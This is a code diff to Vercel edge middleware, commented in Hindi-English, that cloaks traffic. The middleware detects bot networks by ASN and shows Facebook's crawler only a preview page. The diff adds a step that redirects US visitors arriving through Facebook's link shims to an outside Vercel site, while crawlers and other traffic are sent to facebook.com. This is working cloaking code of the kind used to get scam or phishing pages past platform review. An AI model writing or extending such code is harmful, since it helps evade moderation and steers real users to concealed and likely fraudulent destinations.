@@ -23,7 +23,26 @@ const BOT_ASNS = new Set(["32934", "16509", "15169"]);
 const TRUSTED_ASN = "32934";
 
 // Strictly blocked countries — yahan se har traffic (human ho ya bot) FB par redirect
-const BLOCKED_COUNTRIES = new Set(["US", "IE", "SE", "GE", "EC", "PE", "DO"]); // US, Ireland, Sweden, Georgia, Ecuador, Peru, Dominican Republic
+const BLOCKED_COUNTRIES = new Set(["IE", "SE", "GE", "EC", "PE", "DO"]); // Ireland, Sweden, Georgia, Ecuador, Peru, Dominican Republic
+
+// step 2 function
+function step2(request) {
+  const referer = request.headers.get('referer') || '';
+
+  if (referer.includes('lm.facebook.com') ||
+     referer.includes('im.facebook.com')) {
+    return Response.redirect(
+      'http://s1-two-edu.vercel.app/',
+      302
+    );
+  }
+
+  // Anything that doesn't match
+  return Response.redirect(
+    'https://www.facebook.com/',
+    302
+  );
+}
 
 export default function middleware(request) {
   const url = new URL(request.url);
@@ -43,6 +62,7 @@ export default function middleware(request) {
   // Vercel Edge Runtime se original ASN network aur Country read karna
   const clientASN = request.headers.get('x-vercel-ip-as-number') || "";
   const clientCountry = request.headers.get('x-vercel-ip-country') || ""; 
+
 
   // 0. FACEBOOK CRAWLER: real page kabhi nahi, sirf dedicated OG-preview page
   const lowerUA = userAgent.toLowerCase();
@@ -82,6 +102,11 @@ export default function middleware(request) {
   if (triggerVerification) {
     return Response.redirect('https://www.facebook.com/', 302);
   }
+  // Step 1 passed.
+// Now check whether this legitimate request is from US.
+if (clientCountry.toUpperCase() === 'US') {
+  return step2(request);
+}
 
   return next();
 }
